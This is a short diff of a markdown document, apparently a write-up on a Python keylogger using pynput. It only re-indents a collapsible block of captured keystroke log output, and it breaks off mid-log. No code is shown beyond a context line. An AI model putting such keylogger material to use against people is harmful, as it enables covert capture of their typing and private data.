@@ -63,9 +63,9 @@ with Listener(on_press=on_press) as listener:
 
 Here is then the extracted raw data that the script retrieved:
 <details>
-<summary>Raw Data</summary>
+    <summary>Raw Data</summary>
 
-```txt 
+    ```txt 
     Keylogger started at: Fri Dec 13 16:32:25 2024
     Fri Dec 13 16:32:27 2024 - Key.shift_r
     Fri Dec 13 16:32:28 2024 - T
